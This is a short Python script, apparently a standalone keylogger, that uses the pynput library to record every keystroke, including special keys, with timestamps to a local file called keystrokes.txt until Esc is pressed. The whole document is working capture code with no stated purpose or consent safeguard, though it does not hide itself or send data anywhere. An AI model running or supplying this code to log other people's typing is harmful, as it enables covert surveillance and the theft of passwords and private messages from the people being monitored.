from pynput import keyboard
import logging

# Set up logging to file
logging.basicConfig(filename="keystrokes.txt", level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        logging.info('Key pressed: {0}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {0}'.format(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
